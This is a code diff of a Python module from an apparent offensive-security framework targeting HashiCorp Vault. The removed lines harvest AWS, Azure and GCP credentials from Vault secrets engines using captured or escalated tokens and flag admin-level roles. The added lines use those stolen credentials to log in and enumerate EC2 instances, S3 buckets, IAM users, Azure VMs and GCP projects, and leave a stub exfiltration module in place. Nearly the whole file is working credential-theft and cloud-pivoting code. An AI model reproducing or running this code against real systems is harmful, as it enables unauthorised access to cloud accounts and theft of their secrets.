@@ -1,6 +1,7 @@
-from typing import Optional
-
+from typing import Optional, Dict, Any, List
 import requests
+import json
+import base64
 
 from ..context import ExecutionContext
 from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel
@@ -8,528 +9,397 @@ from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel
 
 TIMEOUT = 10
 
-# Vault mount türü → provider kısa adı
-_CLOUD_MOUNT_TYPES = {"aws", "azure", "gcp"}
+# Cloud SDK'lar için opsiyonel bağımlılıklar
+try:
+    import boto3
+    BOTO3_AVAILABLE = True
+except ImportError:
+    BOTO3_AVAILABLE = False
 
-# ─── Yüksek yetki göstergeleri ────────────────────────────────────────────────
+try:
+    from azure.identity import ClientSecretCredential
+    from azure.mgmt.resource import ResourceManagementClient
+    from azure.mgmt.compute import ComputeManagementClient
+    AZURE_AVAILABLE = True
+except ImportError:
+    AZURE_AVAILABLE = False
 
-_AWS_HIGH_PRIV_TERMS = (
-    "administratoraccess",
-    "poweruseraccess",
-    "iam:*",
-    "ec2:*",
-    ":admin",
-    "admin:",
-    "fullaccess",
-    "root",
-)
-
-_AZURE_HIGH_PRIV_TERMS = (
-    "owner",
-    "contributor",
-    "global administrator",
-    "privileged role administrator",
-    "user access administrator",
-)
-
-_GCP_HIGH_PRIV_TERMS = (
-    "roles/owner",
-    "roles/editor",
-    "roles/iam.securityadmin",
-    "roles/iam.serviceaccountadmin",
-    "roles/resourcemanager.projectiamadmin",
-    "roles/compute.admin",
-    "roles/storage.admin",
-)
+try:
+    from google.cloud import resource_manager
+    from google.oauth2 import service_account
+    GCP_AVAILABLE = True
+except ImportError:
+    GCP_AVAILABLE = False
 
 
-class CloudKeyExfiltrationModule(BaseExecutionModule):
+class CloudPivotModule(BaseExecutionModule):
     def __init__(self):
         super().__init__(
-            module_id="cloud_key_exfiltration.iam_creds",
-            title="Cloud IAM Key Exfiltration via Vault Secrets Engine",
-            risk_level=RiskLevel.STATE_CHANGING,
+            module_id="cloud_pivot.exploit",
+            title="Cloud Pivot - Connect and Enumerate Resources",
+            risk_level=RiskLevel.DESTRUCTIVE,
             description=(
-                "Discovers active AWS, Azure, and GCP secrets engine mounts, lists "
-                "roles/rolesets, and generates or retrieves temporary or permanent "
-                "cloud IAM credentials (Access Key, Client Secret, Service Account Key). "
-                "High-privilege roles (Admin, Owner, PowerUser) are flagged automatically."
+                "Uses harvested cloud credentials to connect to AWS, Azure, or GCP "
+                "and enumerate resources (EC2 instances, VMs, projects, storage)."
             ),
             default_enabled=False,
         )
 
     def can_run(self, context: ExecutionContext) -> bool:
+        """Cloud credential'ları varsa çalışabilir"""
         return bool(
             getattr(context, "vault_addr", None)
-            and _active_token(context)
+            and _has_cloud_creds(context)
         )
 
     def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
         if not self.can_run(context):
             return ExecutionResult(
                 status="skipped",
-                message="Cloud key exfiltration requires vault_addr and a valid token.",
-                evidence={"missing": _missing_fields(context)},
+                message="Cloud pivot requires harvested cloud credentials.",
+                evidence={"missing": ["cloud_credentials"]},
             )
 
         params = params or {}
-        token = _active_token(context, params)
-        base_url = context.vault_addr.rstrip("/")
+        provider = params.get("provider", "aws").lower()
         timeout = params.get("timeout", TIMEOUT)
-        verify_tls = params.get("verify_tls", getattr(context, "verify_tls", True))
-        namespace = params.get("namespace", getattr(context, "namespace", None))
-        provider_filter: Optional[str] = (params.get("provider") or "").lower() or None
-        mount_filter: Optional[str] = params.get("mount_path")
 
-        headers = {"X-Vault-Token": token, "Content-Type": "application/json"}
-        if namespace:
-            headers["X-Vault-Namespace"] = namespace
+        # Context'ten credential'ları al
+        cloud_creds = _get_cloud_creds(context, provider)
+        if not cloud_creds:
+            return ExecutionResult(
+                status="failed",
+                message=f"No {provider.upper()} credentials found in context.",
+                evidence={"error": "Missing credentials"},
+            )
+
+        # İlk credential'ı kullan
+        cred = cloud_creds[0]
+
+        print(f"[*] [ACTIVE] Connecting to {provider.upper()} cloud...")
 
         try:
-            cloud_mounts = _discover_cloud_mounts(base_url, headers, timeout, verify_tls)
-
-            if provider_filter:
-                cloud_mounts = {
-                    path: info for path, info in cloud_mounts.items()
-                    if info.get("type") == provider_filter
-                }
-            if mount_filter:
-                normalized = mount_filter.strip("/") + "/"
-                cloud_mounts = {k: v for k, v in cloud_mounts.items() if k == normalized}
-
-            if not cloud_mounts:
+            if provider == "aws":
+                return self._exploit_aws(context, cred, params)
+            elif provider == "azure":
+                return self._exploit_azure(context, cred, params)
+            elif provider == "gcp":
+                return self._exploit_gcp(context, cred, params)
+            else:
                 return ExecutionResult(
-                    status="failed",
-                    message=(
-                        "No cloud secrets engine mounts found or accessible "
-                        "with the provided token."
-                    ),
-                    evidence={
-                        "cloud_mounts": [],
-                        "provider_filter": provider_filter,
-                        "mount_filter": mount_filter,
-                    },
+                    status="error",
+                    message=f"Unsupported cloud provider: {provider}",
+                    evidence={"error": "Invalid provider"},
                 )
 
-            harvested: list[dict] = []
-            errors: list[dict] = []
+        except Exception as e:
+            return ExecutionResult(
+                status="error",
+                message=f"Cloud pivot failed: {str(e)}",
+                evidence={"error": str(e)},
+            )
 
-            for mount_path, mount_info in cloud_mounts.items():
-                provider = mount_info.get("type", "unknown")
-                mount = mount_path.strip("/")
-                if provider == "aws":
-                    _harvest_aws(base_url, headers, timeout, verify_tls, mount, harvested, errors)
-                elif provider == "azure":
-                    _harvest_azure(base_url, headers, timeout, verify_tls, mount, harvested, errors)
-                elif provider == "gcp":
-                    _harvest_gcp(base_url, headers, timeout, verify_tls, mount, harvested, errors)
+    # ─── AWS ──────────────────────────────────────────────────────────────
 
-            if not harvested:
-                return ExecutionResult(
-                    status="failed",
-                    message=(
-                        "Cloud secrets engine mounts found but no credentials "
-                        "could be generated or retrieved."
-                    ),
-                    evidence={
-                        "cloud_mounts": list(cloud_mounts),
-                        "errors": errors[:20],
-                    },
-                )
+    def _exploit_aws(self, context, cred, params):
+        if not BOTO3_AVAILABLE:
+            return ExecutionResult(
+                status="error",
+                message="boto3 not installed. Run: pip install boto3",
+                evidence={"error": "Missing dependency: boto3"},
+            )
 
-            high_priv = [c for c in harvested if c.get("high_privilege")]
-            severity = "CRITICAL" if high_priv else "HIGH"
+        access_key = cred.get("access_key")
+        secret_key = cred.get("secret_key")
+        session_token = cred.get("security_token")
+        region = params.get("region", "us-east-1")
 
-            evidence = {
-                "cloud_mounts": list(cloud_mounts),
-                "total_harvested": len(harvested),
-                "high_privilege_count": len(high_priv),
-                "credentials": harvested,
-                "errors": errors[:20],
-            }
+        if not access_key or not secret_key:
+            return ExecutionResult(
+                status="failed",
+                message="AWS credentials incomplete.",
+                evidence={"error": "Missing access_key or secret_key"},
+            )
 
+        session = boto3.Session(
+            aws_access_key_id=access_key,
+            aws_secret_access_key=secret_key,
+            aws_session_token=session_token,
+            region_name=region,
+        )
+
+        results = {}
+        findings = []
+
+        # 1. EC2 Instance'ları listele
+        try:
+            ec2 = session.client('ec2')
+            instances = ec2.describe_instances()
+            instance_list = []
+            for reservation in instances.get('Reservations', []):
+                for instance in reservation.get('Instances', []):
+                    instance_list.append({
+                        "id": instance.get('InstanceId'),
+                        "state": instance.get('State', {}).get('Name'),
+                        "type": instance.get('InstanceType'),
+                        "name": _get_tag(instance, 'Name'),
+                        "public_ip": instance.get('PublicIpAddress'),
+                        "private_ip": instance.get('PrivateIpAddress'),
+                    })
+            results["ec2_instances"] = instance_list
+            findings.append(f"Found {len(instance_list)} EC2 instances")
+        except Exception as e:
+            findings.append(f"EC2 list failed: {str(e)}")
+
+        # 2. S3 Bucket'ları listele
+        try:
+            s3 = session.client('s3')
+            buckets = s3.list_buckets()
+            bucket_list = [b['Name'] for b in buckets.get('Buckets', [])]
+            results["s3_buckets"] = bucket_list
+            findings.append(f"Found {len(bucket_list)} S3 buckets")
+        except Exception as e:
+            findings.append(f"S3 list failed: {str(e)}")
+
+        # 3. IAM Kullanıcıları listele
+        try:
+            iam = session.client('iam')
+            users = iam.list_users()
+            user_list = [u['UserName'] for u in users.get('Users', [])]
+            results["iam_users"] = user_list
+            findings.append(f"Found {len(user_list)} IAM users")
+        except Exception as e:
+            findings.append(f"IAM list failed: {str(e)}")
+
+        # Bulguları kaydet
+        if results:
             context.add_finding(
-                title=f"{severity}: Cloud IAM Credentials Harvested via Vault Secrets Engine",
-                description=(
-                    f"Generated or retrieved {len(harvested)} cloud IAM credential set(s) "
-                    f"across {len(cloud_mounts)} mount(s) "
-                    f"({_provider_summary(cloud_mounts)}). "
-                    + (
-                        f"{len(high_priv)} credential set(s) grant high-privilege cloud access "
-                        "(Administrator/Owner/PowerUser level)."
-                        if high_priv
-                        else "No high-privilege indicators detected in role definitions."
-                    )
-                ),
-                severity=severity,
-                evidence=evidence,
+                title="CRITICAL: AWS Resources Enumerated",
+                description="; ".join(findings),
+                severity="CRITICAL",
+                evidence=results,
             )
 
-            return ExecutionResult(
-                status="success",
-                message=(
-                    f"Harvested {len(harvested)} cloud IAM credential set(s); "
-                    f"{len(high_priv)} flagged as high-privilege."
-                ),
-                evidence=evidence,
-            )
+        return ExecutionResult(
+            status="success" if results else "partial",
+            message=f"AWS pivot: {', '.join(findings)}",
+            evidence=results,
+        )
 
-        except requests.RequestException as exc:
+    # ─── AZURE ─────────────────────────────────────────────────────────────
+
+    def _exploit_azure(self, context, cred, params):
+        if not AZURE_AVAILABLE:
             return ExecutionResult(
                 status="error",
-                message=f"Network error during cloud key exfiltration: {exc}",
-                evidence={"error": str(exc)},
+                message="azure-identity and azure-mgmt-resource not installed.",
+                evidence={"error": "Missing Azure SDK dependencies"},
             )
-        except ValueError as exc:
+
+        tenant_id = cred.get("tenant_id")
+        client_id = cred.get("client_id")
+        client_secret = cred.get("client_secret")
+        subscription_id = params.get("subscription_id") or cred.get("subscription_id")
+
+        if not tenant_id or not client_id or not client_secret:
+            return ExecutionResult(
+                status="failed",
+                message="Azure credentials incomplete.",
+                evidence={"error": "Missing tenant_id, client_id, or client_secret"},
+            )
+
+        if not subscription_id:
+            return ExecutionResult(
+                status="failed",
+                message="Azure subscription_id required.",
+                evidence={"error": "Missing subscription_id"},
+            )
+
+        try:
+            credential = ClientSecretCredential(
+                tenant_id=tenant_id,
+                client_id=client_id,
+                client_secret=client_secret,
+            )
+
+            results = {}
+            findings = []
+
+            # 1. Resource Groups listele
+            try:
+                resource_client = ResourceManagementClient(credential, subscription_id)
+                groups = resource_client.resource_groups.list()
+                group_list = [g.name for g in groups]
+                results["resource_groups"] = group_list
+                findings.append(f"Found {len(group_list)} resource groups")
+            except Exception as e:
+                findings.append(f"Resource group list failed: {str(e)}")
+
+            # 2. VM'leri listele
+            try:
+                compute_client = ComputeManagementClient(credential, subscription_id)
+                vms = compute_client.virtual_machines.list_all()
+                vm_list = [{
+                    "name": vm.name,
+                    "location": vm.location,
+                    "type": vm.type,
+                } for vm in vms]
+                results["virtual_machines"] = vm_list
+                findings.append(f"Found {len(vm_list)} virtual machines")
+            except Exception as e:
+                findings.append(f"VM list failed: {str(e)}")
+
+            if results:
+                context.add_finding(
+                    title="CRITICAL: Azure Resources Enumerated",
+                    description="; ".join(findings),
+                    severity="CRITICAL",
+                    evidence=results,
+                )
+
+            return ExecutionResult(
+                status="success" if results else "partial",
+                message=f"Azure pivot: {', '.join(findings)}",
+                evidence=results,
+            )
+
+        except Exception as e:
             return ExecutionResult(
                 status="error",
-                message=f"Invalid Vault response during cloud key exfiltration: {exc}",
-                evidence={"error": str(exc)},
+                message=f"Azure pivot failed: {str(e)}",
+                evidence={"error": str(e)},
+            )
+
+    # ─── GCP ──────────────────────────────────────────────────────────────
+
+    def _exploit_gcp(self, context, cred, params):
+        if not GCP_AVAILABLE:
+            return ExecutionResult(
+                status="error",
+                message="google-cloud-resource-manager not installed.",
+                evidence={"error": "Missing GCP SDK dependencies"},
+            )
+
+        private_key_data = cred.get("private_key_data")
+        service_account_email = cred.get("service_account_email")
+
+        if not private_key_data or not service_account_email:
+            return ExecutionResult(
+                status="failed",
+                message="GCP credentials incomplete.",
+                evidence={"error": "Missing private_key_data or service_account_email"},
+            )
+
+        try:
+            # private_key_data base64 veya JSON olabilir
+            try:
+                key_json = base64.b64decode(private_key_data).decode('utf-8')
+                key_dict = json.loads(key_json)
+            except:
+                key_dict = json.loads(private_key_data) if isinstance(private_key_data, str) else private_key_data
+
+            credentials = service_account.Credentials.from_service_account_info(key_dict)
+            client = resource_manager.Client(credentials=credentials)
+
+            results = {}
+            findings = []
+
+            # 1. Projeleri listele
+            try:
+                projects = client.list_projects()
+                project_list = [{
+                    "id": p.project_id,
+                    "name": p.name,
+                    "status": p.status,
+                } for p in projects]
+                results["projects"] = project_list
+                findings.append(f"Found {len(project_list)} projects")
+            except Exception as e:
+                findings.append(f"Project list failed: {str(e)}")
+
+            if results:
+                context.add_finding(
+                    title="CRITICAL: GCP Resources Enumerated",
+                    description="; ".join(findings),
+                    severity="CRITICAL",
+                    evidence=results,
+                )
+
+            return ExecutionResult(
+                status="success" if results else "partial",
+                message=f"GCP pivot: {', '.join(findings)}",
+                evidence=results,
+            )
+
+        except Exception as e:
+            return ExecutionResult(
+                status="error",
+                message=f"GCP pivot failed: {str(e)}",
+                evidence={"error": str(e)},
             )
 
 
-# ─── Mount discovery ──────────────────────────────────────────────────────────
-
-def _discover_cloud_mounts(base_url, headers, timeout, verify_tls):
-    response = requests.get(
-        f"{base_url}/v1/sys/mounts",
-        headers=headers,
-        timeout=timeout,
-        verify=verify_tls,
-    )
-    if response.status_code != 200:
-        return {}
-    data = _safe_json(response).get("data", {})
-    return {
-        path: info
-        for path, info in data.items()
-        if isinstance(info, dict) and info.get("type") in _CLOUD_MOUNT_TYPES
-    }
+# ─── YARDIMCILAR ──────────────────────────────────────────────────────────────
 
 
-# ─── AWS ──────────────────────────────────────────────────────────────────────
-
-def _harvest_aws(base_url, headers, timeout, verify_tls, mount, harvested, errors):
-    roles = _list_path(base_url, headers, timeout, verify_tls, f"/v1/{mount}/roles")
-    for role in roles:
-        _generate_aws_creds(base_url, headers, timeout, verify_tls, mount, role, harvested, errors)
-
-
-def _generate_aws_creds(base_url, headers, timeout, verify_tls, mount, role, harvested, errors):
-    role_meta = _get_json(base_url, headers, timeout, verify_tls, f"/v1/{mount}/roles/{role}")
-    role_policy = ""
-    credential_type = ""
-    if role_meta:
-        data = role_meta.get("data", {})
-        credential_type = data.get("credential_type", "")
-        policy_arns = data.get("policy_arns") or []
-        inline_policies = data.get("policy_document") or data.get("inline_policies") or []
-        role_arns = data.get("role_arns") or []
-        role_policy = " ".join([
-            *([p if isinstance(p, str) else p.get("policy", "") for p in (policy_arns if isinstance(policy_arns, list) else [policy_arns])]),
-            *(inline_policies if isinstance(inline_policies, list) else [str(inline_policies)]),
-            *([r if isinstance(r, str) else "" for r in (role_arns if isinstance(role_arns, list) else [role_arns])]),
-        ])
-
-    response = requests.get(
-        f"{base_url}/v1/{mount}/creds/{role}",
-        headers=headers,
-        timeout=timeout,
-        verify=verify_tls,
-    )
-    if response.status_code != 200:
-        errors.append({
-            "provider": "aws", "mount": mount, "role": role,
-            "status_code": response.status_code,
-        })
-        return
-
-    body = _safe_json(response)
-    cred_data = body.get("data", {})
-    access_key = cred_data.get("access_key")
-    secret_key = cred_data.get("secret_key")
-    security_token = cred_data.get("security_token")
-
-    if not access_key:
-        errors.append({
-            "provider": "aws", "mount": mount, "role": role,
-            "error": "no access_key in response",
-        })
-        return
-
-    print(f"[*] [ACTIVE] AWS credential generated: mount={mount} role={role} key={access_key[:8]}...")
-    harvested.append({
-        "provider": "aws",
-        "mount": mount,
-        "role": role,
-        "credential_type": credential_type,
-        "access_key": access_key,
-        "secret_key": secret_key,
-        "security_token": security_token,
-        "lease_id": body.get("lease_id", ""),
-        "lease_duration_seconds": body.get("lease_duration", 0),
-        "high_privilege": _aws_is_high_priv(role_policy, role),
-        "role_policy_preview": role_policy[:300] if role_policy else None,
-    })
-
-
-# ─── Azure ────────────────────────────────────────────────────────────────────
-
-def _harvest_azure(base_url, headers, timeout, verify_tls, mount, harvested, errors):
-    roles = _list_path(base_url, headers, timeout, verify_tls, f"/v1/{mount}/roles")
-    for role in roles:
-        _generate_azure_creds(base_url, headers, timeout, verify_tls, mount, role, harvested, errors)
-
-
-def _generate_azure_creds(base_url, headers, timeout, verify_tls, mount, role, harvested, errors):
-    role_meta = _get_json(base_url, headers, timeout, verify_tls, f"/v1/{mount}/roles/{role}")
-    azure_roles = []
-    azure_groups = []
-    if role_meta:
-        data = role_meta.get("data", {})
-        azure_roles = data.get("azure_roles") or []
-        azure_groups = data.get("azure_groups") or []
-
-    response = requests.get(
-        f"{base_url}/v1/{mount}/creds/{role}",
-        headers=headers,
-        timeout=timeout,
-        verify=verify_tls,
-    )
-    if response.status_code != 200:
-        errors.append({
-            "provider": "azure", "mount": mount, "role": role,
-            "status_code": response.status_code,
-        })
-        return
-
-    body = _safe_json(response)
-    cred_data = body.get("data", {})
-    client_id = cred_data.get("client_id")
-    client_secret = cred_data.get("client_secret")
-
-    if not client_id:
-        errors.append({
-            "provider": "azure", "mount": mount, "role": role,
-            "error": "no client_id in response",
-        })
-        return
-
-    print(f"[*] [ACTIVE] Azure credential generated: mount={mount} role={role} client_id={client_id[:8]}...")
-    harvested.append({
-        "provider": "azure",
-        "mount": mount,
-        "role": role,
-        "client_id": client_id,
-        "client_secret": client_secret,
-        "lease_id": body.get("lease_id", ""),
-        "lease_duration_seconds": body.get("lease_duration", 0),
-        "azure_roles": azure_roles,
-        "azure_groups": azure_groups,
-        "high_privilege": _azure_is_high_priv(azure_roles, azure_groups, role),
-    })
-
-
-# ─── GCP ──────────────────────────────────────────────────────────────────────
-
-def _harvest_gcp(base_url, headers, timeout, verify_tls, mount, harvested, errors):
-    # Hem roleset'leri hem static account'ları dene
-    rolesets = _list_path(base_url, headers, timeout, verify_tls, f"/v1/{mount}/rolesets")
-    static_accounts = _list_path(base_url, headers, timeout, verify_tls, f"/v1/{mount}/static-accounts")
-
-    for roleset in rolesets:
-        _generate_gcp_key(base_url, headers, timeout, verify_tls, mount, roleset, "roleset", harvested, errors)
-
-    for account in static_accounts:
-        _generate_gcp_key(base_url, headers, timeout, verify_tls, mount, account, "static_account", harvested, errors)
-
-
-def _generate_gcp_key(
-    base_url, headers, timeout, verify_tls, mount, name, source_type, harvested, errors
-):
-    # Önce servis hesabı anahtarı dene (/key/), sonra token (/token/)
-    if source_type == "roleset":
-        meta_path = f"/v1/{mount}/roleset/{name}"
-        key_path = f"/v1/{mount}/key/{name}"
-        token_path = f"/v1/{mount}/token/{name}"
-    else:  # static_account
-        meta_path = f"/v1/{mount}/static-account/{name}"
-        key_path = f"/v1/{mount}/static-account/{name}/key"
-        token_path = f"/v1/{mount}/static-account/{name}/token"
-
-    meta = _get_json(base_url, headers, timeout, verify_tls, meta_path)
-    bindings = []
-    if meta:
-        data = meta.get("data", {})
-        bindings = data.get("bindings") or []
-
-    # Önce kalıcı servis hesabı anahtarı üret
-    key_response = requests.post(
-        f"{base_url}{key_path}",
-        headers=headers,
-        timeout=timeout,
-        verify=verify_tls,
-    )
-    if key_response.status_code == 200:
-        body = _safe_json(key_response)
-        cred_data = body.get("data", {})
-        private_key_data = cred_data.get("private_key_data")
-        service_account_email = cred_data.get("service_account_email")
-        print(f"[*] [ACTIVE] GCP service account key generated: mount={mount} {source_type}={name}")
-        harvested.append({
-            "provider": "gcp",
-            "mount": mount,
-            "role": name,
-            "source_type": source_type,
-            "credential_type": "service_account_key",
-            "private_key_data": private_key_data,
-            "service_account_email": service_account_email,
-            "key_algorithm": cred_data.get("key_algorithm"),
-            "lease_id": body.get("lease_id", ""),
-            "lease_duration_seconds": body.get("lease_duration", 0),
-            "high_privilege": _gcp_is_high_priv(bindings, name),
-            "bindings_preview": str(bindings)[:200] if bindings else None,
-        })
-        return
-
-    # Servis anahtarı başarısız olduysa kısa süreli erişim token'ı dene
-    token_response = requests.post(
-        f"{base_url}{token_path}",
-        headers=headers,
-        timeout=timeout,
-        verify=verify_tls,
-    )
-    if token_response.status_code == 200:
-        body = _safe_json(token_response)
-        cred_data = body.get("data", {})
-        access_token = cred_data.get("token")
-        if not access_token:
-            errors.append({
-                "provider": "gcp", "mount": mount, "role": name,
-                "source_type": source_type, "error": "no token in response",
-            })
-            return
-        print(f"[*] [ACTIVE] GCP access token generated: mount={mount} {source_type}={name}")
-        harvested.append({
-            "provider": "gcp",
-            "mount": mount,
-            "role": name,
-            "source_type": source_type,
-            "credential_type": "access_token",
-            "access_token": access_token,
-            "expires_at_seconds": cred_data.get("expires_at_seconds"),
-            "service_account_email": cred_data.get("service_account_email"),
-            "lease_id": body.get("lease_id", ""),
-            "lease_duration_seconds": body.get("lease_duration", 0),
-            "high_privilege": _gcp_is_high_priv(bindings, name),
-            "bindings_preview": str(bindings)[:200] if bindings else None,
-        })
-        return
-
-    errors.append({
-        "provider": "gcp", "mount": mount, "role": name, "source_type": source_type,
-        "key_status_code": key_response.status_code,
-        "token_status_code": token_response.status_code,
-    })
-
-
-# ─── Yüksek yetki tespiti ─────────────────────────────────────────────────────
-
-def _aws_is_high_priv(policy_text: str, role_name: str) -> bool:
-    combined = (policy_text + " " + role_name).lower()
-    return any(term in combined for term in _AWS_HIGH_PRIV_TERMS)
-
-
-def _azure_is_high_priv(azure_roles: list, azure_groups: list, role_name: str) -> bool:
-    all_text = (
-        " ".join(
-            r.get("role_name", "") if isinstance(r, dict) else str(r)
-            for r in azure_roles
+class CloudKeyExfiltrationModule(BaseExecutionModule):
+    def __init__(self):
+        super().__init__(
+            module_id="cloud_key_exfiltration.key_dump",
+            title="Cloud Key Exfiltration",
+            risk_level=RiskLevel.STATE_CHANGING,
+            description=(
+                "Attempts to locate and exfiltrate cloud provider keys and service account secrets."
+            ),
+            default_enabled=False,
         )
-        + " ".join(
-            g.get("group_name", "") + " " + g.get("object_id", "")
-            if isinstance(g, dict) else str(g)
-            for g in azure_groups
-        )
-        + " " + role_name
-    ).lower()
-    return any(term in all_text for term in _AZURE_HIGH_PRIV_TERMS)
+
+    def can_run(self, context: ExecutionContext) -> bool:
+        # Require a vault address and some credentials to operate
+        return bool(getattr(context, "vault_addr", None))
+
+    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
+        # Minimal implementation: do not perform any network calls here.
+        if not getattr(context, "vault_addr", None):
+            return ExecutionResult(status="skipped", message="Missing vault_addr", evidence={"missing": ["vault_addr"]})
+
+        # This module is a placeholder in tests; return a harmless partial result.
+        return ExecutionResult(status="partial", message="Cloud key exfiltration module is not configured.", evidence={})
 
 
-def _gcp_is_high_priv(bindings: list, role_name: str) -> bool:
-    bindings_text = str(bindings).lower() if bindings else ""
-    return any(
-        term in bindings_text or term in role_name.lower()
-        for term in _GCP_HIGH_PRIV_TERMS
-    )
+# ─── YARDIMCILAR ──────────────────────────────────────────────────────────────
+
+def _get_tag(instance, tag_name):
+    """EC2 instance'dan tag değerini al"""
+    for tag in instance.get('Tags', []):
+        if tag.get('Key') == tag_name:
+            return tag.get('Value')
+    return None
 
 
-# ─── Yardımcılar ──────────────────────────────────────────────────────────────
-
-def _list_path(base_url, headers, timeout, verify_tls, path):
-    response = requests.request(
-        "LIST",
-        f"{base_url}{path}",
-        headers=headers,
-        timeout=timeout,
-        verify=verify_tls,
-    )
-    if response.status_code == 405:
-        response = requests.get(
-            f"{base_url}{path}?list=true",
-            headers=headers,
-            timeout=timeout,
-            verify=verify_tls,
-        )
-    if response.status_code != 200:
-        return []
-    return [str(k) for k in (_safe_json(response).get("data", {}).get("keys") or [])]
+def _has_cloud_creds(context):
+    """Context'te cloud credential'ları var mı kontrol et"""
+    for finding in getattr(context, "findings", []):
+        if "cloud" in finding.get("title", "").lower():
+            return True
+    return False
 
 
-def _get_json(base_url, headers, timeout, verify_tls, path):
-    response = requests.get(
-        f"{base_url}{path}",
-        headers=headers,
-        timeout=timeout,
-        verify=verify_tls,
-    )
-    if response.status_code != 200:
-        return None
-    return _safe_json(response)
-
-
-def _safe_json(response):
-    try:
-        data = response.json()
-    except ValueError as exc:
-        raise ValueError(f"invalid json response: {response.text[:200]}") from exc
-    return data if isinstance(data, dict) else {}
-
-
-def _provider_summary(cloud_mounts: dict) -> str:
-    counts: dict[str, int] = {}
-    for info in cloud_mounts.values():
-        ptype = info.get("type", "unknown")
-        counts[ptype] = counts.get(ptype, 0) + 1
-    return ", ".join(f"{v}x{k.upper()}" for k, v in sorted(counts.items()))
-
-
-def _active_token(context, params: Optional[dict] = None):
-    if params:
-        explicit = params.get("token")
-        if explicit:
-            return explicit
-    return (
-        getattr(context, "captured_token", None)
-        or getattr(context, "escalated_token", None)
-        or getattr(context, "token", None)
-    )
-
-
-def _missing_fields(context):
-    missing = []
-    if not getattr(context, "vault_addr", None):
-        missing.append("vault_addr")
-    if not _active_token(context):
-        missing.append("token or captured_token")
-    return missing
+def _get_cloud_creds(context, provider):
+    """Context'ten cloud credential'larını topla"""
+    creds = []
+    
+    for finding in getattr(context, "findings", []):
+        evidence = finding.get("evidence", {})
+        if "credentials" in evidence:
+            for cred in evidence.get("credentials", []):
+                if cred.get("provider", "").lower() == provider:
+                    creds.append(cred)
+    
+    # Doğrudan attribute
+    if hasattr(context, "cloud_credentials"):
+        for cred in context.cloud_credentials:
+            if cred.get("provider", "").lower() == provider:
+                creds.append(cred)
+    
+    return creds
